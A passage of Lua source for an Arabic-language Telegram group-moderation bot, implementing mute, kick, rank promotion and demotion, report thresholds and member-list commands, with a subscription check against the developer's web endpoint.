send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apsi[2],mute_by_username)
end
if text:match("^كتم (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apsi = {string.match(text, "^(كتم) (%d+)$")}
if ck_mod(apsi[2], msg.chat_id_) or is_creatorbasic(msg, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
database:sadd('fayomy:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
fmX000(apsi[2],msg,"🚫┇تم كتمه من البوت")
end
end
if text:match("^الغاء كتم$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function unmute_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'muted:'..msg.chat_id_
if not database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"🚫┇بالفعل تم الغاء كتمه من البوت")
else
database:srem(hash, result.sender_user_id_)
fmX000("prore",msg,"🚫┇تم الغاء كتمه من البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
if text:match("^الغاء كتم @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apsi = {string.match(text, "^(الغاء كتم) @(.*)$")}
function unmute_by_username(extra, result, success)
if result.id_ then
database:srem('fayomy:'..bot_id..'muted:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apsi[2] or 'FAYOMYYT')..')\n🚫┇تم الغاء كتمه من البوت'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apsi[2],unmute_by_username)
end

if text:match("^الغاء كتم (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apsi = {string.match(text, "^(الغاء كتم) (%d+)$")}
database:srem('fayomy:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
fmX000(apsi[2],msg,"🚫┇تم الغاء كتمه من البوت")
end

if text:match("^طرد$") and msg.reply_to_message_id_ ~=0 and (is_mod(msg) or is_creatorbasic(msg)) then
if not is_creator(msg) and database:get("Fayomy:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
return "fmhakke"
end
function kick_reply(extra, result, success)
if ck_mod(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
fmX000("prore",msg,"🚫┇تم طرده من المجموعه")
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end  
if text:match("^طرد @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then 
if not is_creator(msg) and database:get("Fayomy:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
return "fmhakke"
end
local apki = {string.match(text, "^(طرد) @(.*)$")}
function kick_by_username(extra, result, success)
if result.id_ then
if ck_mod(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apki[2] or 'FAYOMYYT')..')\n🚫┇تم طرده من المجموعه'
chat_kick(msg.chat_id_, result.id_)
end
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apki[2],kick_by_username)
end  
if text:match("^طرد (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then 
if not is_creator(msg) and database:get("Fayomy:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
return "fmhakke"
end
local apki = {string.match(text, "^(طرد) (%d+)$")}
if ck_mod(apki[2], msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
chat_kick(msg.chat_id_, apki[2])
fmX000(apki[2],msg,"🚫┇تم طرده من المجموعه")
end
end
if text:match("^تنزيل الكل$") and  is_creatorbasic(msg) and not  is_sudo(msg) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
database:srem('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "🙋🏻‍♂️※ تم تنزيل الشخص من جميع الرتب ✓ 🔱", 1, 'md')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
--------------------------------------------------------------------------
if text:match("^تنزيل الكل$") and  is_creator(msg) and not (is_creatorbasic(msg) and  is_sudo(msg)) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
database:srem('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "🙋🏻‍♂️※ تم تنزيل الشخص من جميع الرتب ✓ 🔱", 1, 'md')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
--------------------------------------------------------------------------
if text:match("^تنزيل الكل$") and  is_owner(msg) and not (is_creatorbasic(msg) and  is_creator(msg) and  is_sudo(msg)) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
database:srem('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "🙋🏻‍♂️※ تم تنزيل الشخص من جميع الرتب ✓ 🔱", 1, 'md')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
--------------------------------------------------------------------------
if text:match("^تنزيل الكل$") and  is_sudo(msg)  and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
database:srem('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
database:srem('fayomy:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "🙋🏻‍♂️※ تم تنزيل الشخص من جميع الرتب ✓ 🔱", 1, 'md')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع مدير$") and (is_creator(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function setowner_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'owners:'..msg.chat_id_
if database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"※ بالفعل تم رفعة مدير في البوت ✓ 👩🏿‍🚒")
else
database:sadd(hash, result.sender_user_id_)
fmX000("prore",msg,"※ تم رفعة مدير في البوت ✓ 👩🏿‍🚒")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setowner_by_reply)
end  
if text:match("^رفع مدير @(.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apow = {string.match(text, "^(رفع مدير) @(.*)$")}
function setowner_by_username(extra, result, success)
if result.id_ then
database:sadd('fayomy:'..bot_id..'owners:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apow[2] or 'FAYOMYYT')..')\n※ تم رفعة مدير في البوت ✓ 👩🏿‍🚒'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apow[2],setowner_by_username)
end 

if text:match("^رفع مدير (%d+)$") and (is_creator(msg) or is_creatorbasic(msg)) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apow = {string.match(text, "^(رفع مدير) (%d+)$")}
database:sadd('fayomy:'..bot_id..'owners:'..msg.chat_id_, apow[2])
fmX000(apow[2],msg,"※ تم رفعة مدير في البوت ✓ 👩🏿‍🚒")
end  
if text:match("^تنزيل مدير$") and (is_creator(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function deowner_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'owners:'..msg.chat_id_
if not database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"※ بالفعل تم تنزيله من مدراء  البوت ✓👨🏻‍⚖️")
else
database:srem(hash, result.sender_user_id_)
fmX000("prore",msg,"※ تم تنزيله من مدراء  البوت ✓👨🏻‍⚖️")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,deowner_by_reply)
end  
if text:match("^تنزيل مدير @(.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apow = {string.match(text, "^(تنزيل مدير) @(.*)$")}
local hash =  'fayomy:'..bot_id..'owners:'..msg.chat_id_
function remowner_by_username(extra, result, success)
if result.id_ then
database:srem(hash, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apow[2] or 'FAYOMYYT')..')\n※ تم تنزيله من مدراء  البوت ✓👨🏻‍⚖️'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apow[2],remowner_by_username)
end  
if text:match("^تنزيل مدير (%d+)$") and (is_creator(msg) or is_creatorbasic(msg)) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local hash =  'fayomy:'..bot_id..'owners:'..msg.chat_id_
local apow = {string.match(text, "^(تنزيل مدير) (%d+)$")}
database:srem(hash, apow[2])
fmX000(apow[2],msg,"※ تم تنزيله من مدراء  البوت ✓👨🏻‍⚖️")
end
if text:match("^الادمنيه$") and (is_owner(msg) or is_creatorbasic(msg)) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local hash =   'fayomy:'..bot_id..'mods:'..msg.chat_id_
local list = database:smembers(hash)
text = "👨‍👧‍👦 ※ قائمه الادمنيه  ✓ ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️※ لا يوجد ادمنية  ✓"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
-----------------------------------------------
if (text and text == "ابلاغ" and msg.reply_to_message_id_ ~= 0 and (not database:get("fayomy:mute:deleta:msg:"..bot_id..msg.chat_id_))) then 
b = database:get("fayomy:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_)
if b and b == os.date("%x") then 
send(msg.chat_id_, msg.id_, 1, "👤┇ لا يمكنك الابلاغ اكثر من مره في اليوم", 1, 'html')
else
database:set("fayomy:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_,os.date("%x"))
y = database:get("fmahke:fel:o:me:"..bot_id..msg.chat_id_) or 10
x = database:get("fmahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_) or 0
send(msg.chat_id_, msg.reply_to_message_id_, 1, "⚠┇تم الابلاغ على الرساله\n⚠┇تبقى {"..(y-(x+1)).."} حتى يتم حذف الرساله", 1, 'html')
database:incr("fmahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)
if (database:get("fmahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)) then 
x = database:get("fmahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)
y = database:get("fmahke:fel:o:me:"..bot_id..msg.chat_id_) or 10
if tonumber(x) >= tonumber(y) then 
send(msg.chat_id_, 0, 1, "⚠┇تم حذف الرساله", 1, 'html')
delete_msg(msg.chat_id_, {[0] = msg.reply_to_message_id_})
end
end
end 
end
if (text and text == "تعطيل الابلاغ"  and (is_creator(msg) or is_creatorbasic(msg))) then 
database:set("fayomy:mute:deleta:msg:"..bot_id..msg.chat_id_,"FMHAKEE")
send(msg.chat_id_, msg.id_, 1, "🔓┇تم تعطيل خاصيه الابلاغ", 1, 'html')
end
if (text and text == "تفعيل الابلاغ"  and (is_creator(msg) or is_creatorbasic(msg))) then 
database:del("fayomy:mute:deleta:msg:"..bot_id..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, "🔓┇تم تفعيل خاصيه الابلاغ", 1, 'html')
end
if text and text:match("(تعين عدد الابلاغ) (%d+)") and (is_creator(msg) or is_creatorbasic(msg)) then 
local a = {string.match(text, "^(تعين عدد الابلاغ) (%d+)$")}
database:set("fmahke:fel:o:me:"..bot_id..msg.chat_id_,a[2])
send(msg.chat_id_, msg.id_, 1, "👤┇تم تعين عدد الابلاغ {"..a[2].."}", 1, 'html')
end
if text:match("^الاعضاء المميزين") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =   'fayomy:'..bot_id..'vipgp:'..msg.chat_id_
local list = database:smembers(hash)
text = "👨‍👨‍👧‍👦 ※ قائمة الاعضاء المميزين ✓،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️※ لا يوجد اعضاء مميزين  ✓"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^قائمه المنع$") and (is_mod(msg) or is_creatorbasic(msg)) then
local hash =  'fayomy:'..bot_id..'filters:'..msg.chat_id_
if hash then
local names = database:hkeys(hash)
text = "⚠┇قائمة الكلمات الممنوعه ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for i=1, #names do
text = text.."<b>|"..i.."|</b>~⪼("..names[i]..")\n"
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #names == 0 then
text = "✖┇لايوجد كلمات ممنوعه"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
if text and text == "عدد الكروب" and (is_mod(msg) or is_creatorbasic(msg)) then 
function dl_cb22( t1,t2 )
local fayomy_098 = 0
if database:get("fayomy:get:mod:"..bot_id..msg.chat_id_) then 
t = database:get("fayomy:get:mod:"..bot_id..msg.chat_id_)
fayomy_098 = tonumber(t2.member_count_) - tonumber(t)
end
send(msg.chat_id_, msg.id_, 1, "🔖┇عدد المجموعه\n👤┇عدد المدراء : "..t2.administrator_count_.."\n👥┇عدد الاعضاء : "..t2.member_count_.." | ("..fayomy_098..")\n🔥┇عدد المطرودين : "..t2.kicked_count_, 1, 'md')
database:set("fayomy:get:mod:"..bot_id..msg.chat_id_,t2.member_count_)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb22, nil)
end
if text:match("^المكتومين$") and (is_mod(msg) or is_creatorbasic(msg)) then
local hash =   'fayomy:'..bot_id..'muted:'..msg.chat_id_
local list = database:smembers(hash)
text = "💢 ※ قائمة المكتومين   ✓ ،\n┉ ꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ\n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "🤹🏻‍♂️※ لا يوجد مكتومين   ✓"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^المدراء$") and (is_creator(msg) or is_creatorbasic(msg)) then
local hash =   'fayomy:'..bot_id..'owners:'..msg.chat_id_
local list = database:smembers(hash)
text = "👨‍👧※ قائمه المدراء  ✓  ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️※ لا يوجد مدراء  ✓"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^المحظورين$") and (is_mod(msg) or is_creatorbasic(msg)) then
local hash =   'fayomy:'..bot_id..'banned:'..msg.chat_id_
local list = database:smembers(hash)
text = "📛※ قائمة المحظورين   ✓  ،\n┉ ꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ\n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "🤹🏿‍♀️※ لا يوجد محظورين    ✓"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if  msg.content_.text_:match("^قائمه العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local hash =   'fayomy:'..bot_id..'gbanned:'
local list = database:smembers(hash)
text = "⛔┇قائمة الحظر العام  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "✖┇لايوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if  msg.content_.text_:match("^المكتومين عام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local hash =   'fayomy:'..bot_id..'gmuted:'
local list = database:smembers(hash)
text = "⛔┇قائمة الكتم العام  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "✖┇لايوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end  
if (text and text == "رتبتي") then
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍✈️'
elseif is_creatorbasic(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ  الكروب 👨🏻‍🚒'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب  👩🏿‍🚀'
elseif is_mod(msg) then
t = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or ' ادمن الكروب خالي 👩🏿‍🚒'
elseif is_vip(msg) then
t = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or 'عضو مميز  🧟‍♂'
else
t = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو محد يحترمك 👶🏻😹' 
end
send(msg.chat_id_, msg.id_, 1,"👨🏻‍⚖️┇رتبتك >> "..t.."", 1, 'md')
end

if text:match("^ايدي$") and msg.reply_to_message_id_ ~= 0 then
function id_by_reply(extra, result, success)
if not database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then 
local tahna = (database:get('fayomy:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_) or 0)
if tonumber((database:get('fayomy:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_) or 0)) == 0 then
nko = '0'
else
nko = (database:get('fayomy:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_))
end
local msgs = ((database:get('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_) or 0) + tahna)
local edit = database:get('fayomy:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.sender_user_id_) or 0
local msg2 = msg
local user_msgs = msgs
local iking_text = "غير متفاعل"
if user_msgs then 
if tonumber(user_msgs) < 50 then 
iking_text = "غير متفاعل"
elseif tonumber(user_msgs) < 100 then 
iking_text = "آستمر بطل"
elseif tonumber(user_msgs) < 1000 then 
iking_text = "متفآعل "
elseif tonumber(user_msgs) < 2000 then 
iking_text = "عضو نشط"
elseif tonumber(user_msgs) < 3000 then 
iking_text = "اقوئ تفاعل"
elseif tonumber(user_msgs) < 4000 then 
iking_text = "عضو متفاعل قوي"
elseif tonumber(user_msgs) < 5000 then 
iking_text = "جيد بتفاعل"
elseif tonumber(user_msgs) > 5000 then 
iking_text = "متفاعل كلش"
end
king = database:smembers('king:all:pppp:tt:'..bot_id) or 0
if (king or king[1]) then 
for i=1, #king do
local tttee = database:get("king:set:text:p"..bot_id..king[i])
if tonumber(user_msgs) >= tonumber(king[i]) then 
iking_text = tttee
end
end
end
end
msg2.sender_user_id_ = result.sender_user_id_
if msg.sender_user_id_ == tonumber(sudo_add) then
fayomy_oop = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg2) then
fayomy_oop = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
fayomy_oop = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
fayomy_oop = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_)
elseif is_creator(msg) then
fayomy_oop = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) ..bot_id..msg.chat_id_)) then 
fayomy_oop = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
elseif is_owner(msg2) then
fayomy_oop = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg2) then
fayomy_oop = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg2) then
fayomy_oop = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
fayomy_oop = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
send(msg.chat_id_, msg.id_, 1,"🎟 ※ ايدي ✓ `("..result.sender_user_id_..")`\n🗳 ※ موقعه ✓ ("..fayomy_oop..")\n💌 ※ عدد رسائل ✓`("..msgs..")`\n📧※عدد السحكات ✓ `("..edit..")`\n📩 ※ تفاعلك ✓ `("..iking_text..")`\n📥 ※ مجوهرآتك ✓*("..nko..")*", 1, 'md')
else
send(msg.chat_id_, msg.id_, 1,"`"..result.sender_user_id_.."`", 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply)
end  
if text:match("^ايدي @(.*)$") then
local ap = {string.match(text, "^(ايدي) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if not database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then 
local tahna = (database:get('fayomy:'..bot_id..'nummsg'..msg.chat_id_..result.id_) or 0)
if tonumber((database:get('fayomy:'..bot_id..'add:numall'..msg.chat_id_..result.id_) or 0)) == 0 then
nko = '0'
else
nko = (database:get('fayomy:'..bot_id..'add:numall'..msg.chat_id_..result.id_))
end
local msgs = ((database:get('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
local edit = database:get('fayomy:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.id_) or 0
local msg2 = msg
msg2.sender_user_id_ = result.id_
local user_msgs = ((database:get('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
local iking_text = "غير متفاعل"
if user_msgs then 
if tonumber(user_msgs) < 50 then 
iking_text = "غير متفاعل"
elseif tonumber(user_msgs) < 100 then 
iking_text = "آستمر بطل"
elseif tonumber(user_msgs) < 1000 then 
iking_text = "متفآعل "
elseif tonumber(user_msgs) < 2000 then 
iking_text = "عضو نشط"
elseif tonumber(user_msgs) < 3000 then 
